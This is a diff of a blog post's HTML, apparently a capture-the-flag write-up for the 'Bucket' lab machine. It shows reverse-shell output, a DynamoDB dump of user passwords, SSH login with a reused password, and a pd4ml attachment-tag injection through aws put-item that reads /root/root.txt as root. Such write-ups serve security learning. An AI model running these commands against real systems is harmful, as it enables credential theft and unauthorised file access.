+&lt;span class="k"&gt;connect&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;10.10.14.11&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;from&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;UNKNOWN&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;10.10.10.212&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;54924&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="n"&gt;Linux&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bucket&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;5.4.0&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;48&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;generic&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;#52&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;Ubuntu&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;SMP&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Thu&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Sep&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;58&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;49&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;UTC&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2020&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;x86_64&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;x86_64&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;x86_64&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;GNU&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Linux&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;22&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;03&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;up&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;08&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;user&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="k"&gt;load&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;average&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;0.01&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;0.20&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;0.25&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="k"&gt;USER&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="n"&gt;TTY&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt;             &lt;/span&gt;&lt;span class="n"&gt;LOGIN&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="n"&gt;IDLE&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="n"&gt;JCPU&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="n"&gt;PCPU&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;WHAT&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="n"&gt;roy&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="n"&gt;pts&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mf"&gt;10.10.14.11&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mi"&gt;18&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;59&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mf"&gt;56.00&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mf"&gt;0.44&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mf"&gt;0.44&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;bash&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;33&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="k"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;33&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="k"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;33&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="k"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nl"&gt;sh&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;can&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;access&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;tty&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;job&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;control&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;turned&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;off&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;BOOM, we are inside!&lt;/p&gt;
 &lt;h1&gt;User&lt;/h1&gt;
 &lt;p&gt;Escalating privileges in this case is quite simple, but we have to combine something new to find, with some foothold info. And with some luck, if it was a real life scenario.&lt;/p&gt;
 &lt;p&gt;Of course it is recomended to start some enumaration scripts in this moment. Like &lt;em&gt;LinEnum&lt;/em&gt; or &lt;em&gt;linpeas&lt;/em&gt; and I encourage you to do it. But lets jump straight to the solution.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="nb"&gt;cd&lt;/span&gt; /home
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ &lt;span class="nb"&gt;cd&lt;/span&gt; /home
 $ ls
 roy
 $ &lt;span class="nb"&gt;cd&lt;/span&gt; roy
@@ -161,29 +140,25 @@ project
 user.txt
 $ cat user.txt
 cat: user.txt: Permission denied
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;That give us at least the user name: &lt;em&gt;roy&lt;/em&gt;. Great, but what about the password. Lets step back, to the foothold. We know about the dynamodb service, and we probably have access to id. Why not try to dive in it?&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;aws --endpoint-url&lt;span class="o"&gt;=&lt;/span&gt;http://s3.bucket.htb dynamodb list-tables
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;aws --endpoint-url&lt;span class="o"&gt;=&lt;/span&gt;http://s3.bucket.htb dynamodb list-tables
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Result:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="p"&gt;{&lt;/span&gt;
     &lt;span class="nt"&gt;&amp;quot;TableNames&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
         &lt;span class="s2"&gt;&amp;quot;users&amp;quot;&lt;/span&gt;
     &lt;span class="p"&gt;]&lt;/span&gt;
 &lt;span class="p"&gt;}&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;aws --endpoint-url&lt;span class="o"&gt;=&lt;/span&gt;http://s3.bucket.htb dynamodb scan --table-name users
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;aws --endpoint-url&lt;span class="o"&gt;=&lt;/span&gt;http://s3.bucket.htb dynamodb scan --table-name users
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Result:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="p"&gt;{&lt;/span&gt;
     &lt;span class="nt"&gt;&amp;quot;Items&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
         &lt;span class="p"&gt;{&lt;/span&gt;
             &lt;span class="nt"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
@@ -214,11 +189,10 @@ cat: user.txt: Permission denied
     &lt;span class="nt"&gt;&amp;quot;ScannedCount&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
     &lt;span class="nt"&gt;&amp;quot;ConsumedCapacity&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;
 &lt;span class="p"&gt;}&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;We have found three passwords to try. And guess what: we can use the third one to log in through &lt;em&gt;ssh&lt;/em&gt; to &lt;em&gt;roy's&lt;/em&gt; account!&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ssh roy@10.10.10.212
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ssh roy@10.10.10.212
 Welcome to Ubuntu &lt;span class="m"&gt;20&lt;/span&gt;.04 LTS &lt;span class="o"&gt;(&lt;/span&gt;GNU/Linux &lt;span class="m"&gt;5&lt;/span&gt;.4.0-48-generic x86_64&lt;span class="o"&gt;)&lt;/span&gt;
 
  * Documentation:  https://help.ubuntu.com
@@ -254,12 +228,11 @@ roy@bucket:~$ ls
 project  user.txt
 roy@bucket:~$ cat user.txt 
 1845bbd4c30469474a3f5d2be1a32922
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;As we have the user flag, lets jump into the final part.&lt;/p&gt;
 &lt;h1&gt;Root&lt;/h1&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;roy@bucket:~$ &lt;span class="nb"&gt;cd&lt;/span&gt; /var/www/
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;roy@bucket:~$ &lt;span class="nb"&gt;cd&lt;/span&gt; /var/www/
 roy@bucket:/var/www$ ls -l
 total &lt;span class="m"&gt;8&lt;/span&gt;
 drwxr-x---+ &lt;span class="m"&gt;4&lt;/span&gt; root root &lt;span class="m"&gt;4096&lt;/span&gt; Feb &lt;span class="m"&gt;10&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt;:29 bucket-app
@@ -297,166 +270,143 @@ use Aws&lt;span class="se"&gt;\D&lt;/span&gt;ynamoDb&lt;span class="se"&gt;\D&lt
 &lt;span class="k"&gt;else&lt;/span&gt;
 &lt;span class="o"&gt;{&lt;/span&gt;
 ?&amp;gt;
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Looks promissing, but will it be enough? To escalate to root we need to take controll over a process running with root privileges. We will take a look at the apache config:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;roy@bucket:/var/www/bucket-app$ head /etc/apache2/sites-available/000-default.conf 
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;roy@bucket:/var/www/bucket-app$ head /etc/apache2/sites-available/000-default.conf 
 &amp;lt;VirtualHost &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1:8000&amp;gt;
         &amp;lt;IfModule mpm_itk_module&amp;gt;
                 AssignUserId root root
         &amp;lt;/IfModule&amp;gt;
         DocumentRoot /var/www/bucket-app
 &amp;lt;/VirtualHost&amp;gt;
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;God bless the man who did it. And forbid him.&lt;/p&gt;
 &lt;p&gt;Now we need to read carefully what we have above in the &lt;strong&gt;index.php&lt;/strong&gt; file.&lt;/p&gt;
 &lt;p&gt;There is a script, that is executed by a certain request from the vulnerable machine:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;curl -X POST -F &lt;span class="s1"&gt;&amp;#39;action=get_alerts&amp;#39;&lt;/span&gt; http://127.0.0.1:8000 &lt;span class="p"&gt;;&lt;/span&gt; rm /tmp/hack/* &lt;span class="p"&gt;;&lt;/span&gt; cp * /tmp/unc
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;curl -X POST -F &lt;span class="s1"&gt;&amp;#39;action=get_alerts&amp;#39;&lt;/span&gt; http://127.0.0.1:8000 &lt;span class="p"&gt;;&lt;/span&gt; rm /tmp/hack/* &lt;span class="p"&gt;;&lt;/span&gt; cp * /tmp/unc
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;But to do anything we have to insert something to &lt;em&gt;alerts&lt;/em&gt; table in dynamodb with the title of &lt;em&gt;Ransomware&lt;/em&gt;. We have seen before, that there is no such table as &lt;em&gt;alerts&lt;/em&gt;, so we have first to create it:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;aws --endpoint-url&lt;span class="o"&gt;=&lt;/span&gt;http://s3.bucket.htb dynamodb create-table --table-name alerts --attribute-definitions &lt;span class="nv"&gt;AttributeName&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;title,AttributeType&lt;span class="o"&gt;=&lt;/span&gt;S &lt;span class="nv"&gt;AttributeName&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;data,AttributeType&lt;span class="o"&gt;=&lt;/span&gt;S --key-schema &lt;span class="nv"&gt;AttributeName&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;title,KeyType&lt;span class="o"&gt;=&lt;/span&gt;HASH &lt;span class="nv"&gt;AttributeName&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;data,KeyType&lt;span class="o"&gt;=&lt;/span&gt;RANGE --provisioned-throughput &lt;span class="nv"&gt;ReadCapacityUnits&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;,WriteCapacityUnits&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;aws --endpoint-url&lt;span class="o"&gt;=&lt;/span&gt;http://s3.bucket.htb dynamodb create-table --table-name alerts --attribute-definitions &lt;span class="nv"&gt;AttributeName&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;title,AttributeType&lt;span class="o"&gt;=&lt;/span&gt;S &lt;span class="nv"&gt;AttributeName&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;data,AttributeType&lt;span class="o"&gt;=&lt;/span&gt;S --key-schema &lt;span class="nv"&gt;AttributeName&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;title,KeyType&lt;span class="o"&gt;=&lt;/span&gt;HASH &lt;span class="nv"&gt;AttributeName&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;data,KeyType&lt;span class="o"&gt;=&lt;/span&gt;RANGE --provisioned-throughput &lt;span class="nv"&gt;ReadCapacityUnits&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;,WriteCapacityUnits&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;then we will be able to inject out exploit:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;aws --endpoint-url&lt;span class="o"&gt;=&lt;/span&gt;http://s3.bucket.htb dynamodb put-item --table-name alerts --item &lt;span class="s1"&gt;&amp;#39; { &amp;quot;title&amp;quot;: {&amp;quot;S&amp;quot;: &amp;quot;Ransomware&amp;quot;}, &amp;quot;data&amp;quot;: {&amp;quot;S&amp;quot;: &amp;quot;EXPLOIT PLACEHOLDER&amp;quot;} } &amp;#39;&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;aws --endpoint-url&lt;span class="o"&gt;=&lt;/span&gt;http://s3.bucket.htb dynamodb put-item --table-name alerts --item &lt;span class="s1"&gt;&amp;#39; { &amp;quot;title&amp;quot;: {&amp;quot;S&amp;quot;: &amp;quot;Ransomware&amp;quot;}, &amp;quot;data&amp;quot;: {&amp;quot;S&amp;quot;: &amp;quot;EXPLOIT PLACEHOLDER&amp;quot;} } &amp;#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;But wait, do we have one? Sure, take a look at the line: &lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="x"&gt;passthru(&amp;quot;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="x"&gt;passthru(&amp;quot;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;it is our key to the kingdom. Google &lt;em&gt;pd4ml vulnerabilities&lt;/em&gt; to find this awesome article: https://infosecwriteups.com/how-i-hacked-redbus-an-online-bus-ticketing-application-24ef5bb083cd about &lt;em&gt;pd4ml:attachment&lt;/em&gt; tag, that we can use here. &lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;aws --endpoint-url&lt;span class="o"&gt;=&lt;/span&gt;http://s3.bucket.htb dynamodb put-item --table-name alerts --item &lt;span class="s1"&gt;&amp;#39; { &amp;quot;title&amp;quot;: {&amp;quot;S&amp;quot;: &amp;quot;Ransomware&amp;quot;}, &amp;quot;data&amp;quot;: {&amp;quot;S&amp;quot;: &amp;quot;&amp;lt;html&amp;gt; &amp;lt;pd4ml:attachment src=file:///root/root.txt description=test&amp;gt;&amp;lt;/pd4ml:attachment&amp;gt;&amp;lt;/html&amp;gt;&amp;quot;} } &amp;#39;&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;aws --endpoint-url&lt;span class="o"&gt;=&lt;/span&gt;http://s3.bucket.htb dynamodb put-item --table-name alerts --item &lt;span class="s1"&gt;&amp;#39; { &amp;quot;title&amp;quot;: {&amp;quot;S&amp;quot;: &amp;quot;Ransomware&amp;quot;}, &amp;quot;data&amp;quot;: {&amp;quot;S&amp;quot;: &amp;quot;&amp;lt;html&amp;gt; &amp;lt;pd4ml:attachment src=file:///root/root.txt description=test&amp;gt;&amp;lt;/pd4ml:attachment&amp;gt;&amp;lt;/html&amp;gt;&amp;quot;} } &amp;#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Finding a perfect syntax to send to the db is a bit of a pain. The &lt;em&gt;description&lt;/em&gt; attribute seems to be mandatory, but -- thanks God -- brackets around the arguments values aren't, which makes it a bit easier to read, cause we don't need to escape it.&lt;/p&gt;
 &lt;p&gt;There is one more problem. There is a cront task, that is clearing the database and the &lt;em&gt;/var/www/bucket-app/files&lt;/em&gt; directory every few minutes. So we have to be fast. Or smart. Fast and smart.&lt;/p&gt;
 &lt;p&gt;We have to execute this oneliner on our machine:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;aws --endpoint-url&lt;span class="o"&gt;=&lt;/span&gt;http://s3.bucket.htb dynamodb create-table --table-name alerts --attribute-definitions &lt;span class="nv"&gt;AttributeName&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;title,AttributeType&lt;span class="o"&gt;=&lt;/span&gt;S &lt;span class="nv"&gt;AttributeName&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;data,AttributeType&lt;span class="o"&gt;=&lt;/span&gt;S --key-schema &lt;span class="nv"&gt;AttributeName&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;title,KeyType&lt;span class="o"&gt;=&lt;/span&gt;HASH &lt;span class="nv"&gt;AttributeName&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;data,KeyType&lt;span class="o"&gt;=&lt;/span&gt;RANGE --provisioned-throughput &lt;span class="nv"&gt;ReadCapacityUnits&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;,WriteCapacityUnits&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;aws --endpoint-url&lt;span class="o"&gt;=&lt;/span&gt;http://s3.bucket.htb dynamodb put-item --table-name alerts --item &lt;span class="s1"&gt;&amp;#39; { &amp;quot;title&amp;quot;: {&amp;quot;S&amp;quot;: &amp;quot;Ransomware&amp;quot;}, &amp;quot;data&amp;quot;: {&amp;quot;S&amp;quot;: &amp;quot;&amp;lt;html&amp;gt; &amp;lt;pd4ml:attachment src=file:///root/root.txt description=test&amp;gt;&amp;lt;/pd4ml:attachment&amp;gt;&amp;lt;/html&amp;gt;&amp;quot;} } &amp;#39;&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;aws --endpoint-url&lt;span class="o"&gt;=&lt;/span&gt;http://s3.bucket.htb dynamodb create-table --table-name alerts --attribute-definitions &lt;span class="nv"&gt;AttributeName&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;title,AttributeType&lt;span class="o"&gt;=&lt;/span&gt;S &lt;span class="nv"&gt;AttributeName&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;data,AttributeType&lt;span class="o"&gt;=&lt;/span&gt;S --key-schema &lt;span class="nv"&gt;AttributeName&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;title,KeyType&lt;span class="o"&gt;=&lt;/span&gt;HASH &lt;span class="nv"&gt;AttributeName&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;data,KeyType&lt;span class="o"&gt;=&lt;/span&gt;RANGE --provisioned-throughput &lt;span class="nv"&gt;ReadCapacityUnits&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;,WriteCapacityUnits&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;aws --endpoint-url&lt;span class="o"&gt;=&lt;/span&gt;http://s3.bucket.htb dynamodb put-item --table-name alerts --item &lt;span class="s1"&gt;&amp;#39; { &amp;quot;title&amp;quot;: {&amp;quot;S&amp;quot;: &amp;quot;Ransomware&amp;quot;}, &amp;quot;data&amp;quot;: {&amp;quot;S&amp;quot;: &amp;quot;&amp;lt;html&amp;gt; &amp;lt;pd4ml:attachment src=file:///root/root.txt description=test&amp;gt;&amp;lt;/pd4ml:attachment&amp;gt;&amp;lt;/html&amp;gt;&amp;quot;} } &amp;#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;and after that this one on the vulnerable one:&lt;/p&gt;
